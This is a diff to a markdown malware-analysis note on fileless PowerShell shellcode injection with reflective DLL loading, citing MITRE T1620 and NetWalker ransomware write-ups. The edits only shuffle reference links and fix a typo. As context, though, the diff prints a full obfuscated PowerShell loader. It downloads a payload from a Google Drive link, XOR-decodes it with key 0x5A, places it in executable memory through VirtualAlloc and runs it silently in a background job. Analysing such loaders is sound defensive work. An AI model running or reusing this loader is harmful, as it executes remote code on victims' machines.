@@ -1,9 +1,5 @@
 # PowerShell - In-Memory Shellcode Injection/Execution With Fileless DLLs Reflective Loading
 
-> https://attack.mitre.org/techniques/T1620/
-
-> https://stonefly.com/blog/netwalker-ransomware-fileless-malware-recovery/
-
 There is another PowerShell command launched:
 ```powershell
 $s = {try {$a = 'System.Con'; $b = 'vert'; $c= [Type]::GetType($a + $b); $d = $c::('From' + 'Base64' + 'String'); $u = 'https://drive.google.com/uc?export=download&id=<stripped>'; $k = 0x5A; $w = New-Object Net.WebClient; $f = $w.DownloadString($u); $e = $d.Invoke($f); for ($i = 0; $i -lT $e.Length; $i++) {$e[$i] = $e[$i] -bxor $k}; $n = 'using System;using System.Runtime.InteropServices;public class N{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d); [DllImport("msvcrt.dll", CallingConvention=CallingConvention.Cdecl)]public static IntPtr memcpy(IntPtr d, byte[] s, int c); [UnmanagedFunctionPointer(CallingConvention StdCall)]public delegate uint R();}';Add-Type $n -EA SilentlyContinue; $m = [N]::VirtualAlloc([IntPtr]::Zero, $e.Length, 0x1000, 0x40); [N]::memcpy($m,$e,$e.Length) | Out-Null; $r = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer ($m,[N+R]); $r.Invoke()} catch{}}; Start-Job -ScriptBlock $s | Out-Null
@@ -110,7 +106,7 @@ for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = $buf[$i] -bxor 0x5A }
 
 ## Python Decryptor
 
-If `downloaded.bin` is Base64 text,  itcan be decoded to raw bytes offline and then XOR.
+If `downloaded.bin` is Base64 text, it can be decoded to raw bytes offline and then XOR.
 
 Here’s a non-executing Python decoder that writes the decrypted payload to disk but does not run it:
 ```python
@@ -133,4 +129,5 @@ strings -a stage2.bin | head
 > https://attack.mitre.org/techniques/T1620/
 > 
 > https://stonefly.com/blog/netwalker-ransomware-fileless-malware-recovery/
+> 
 > https://www.cynet.com/attack-techniques-hands-on/netwalker-ransomware-report/
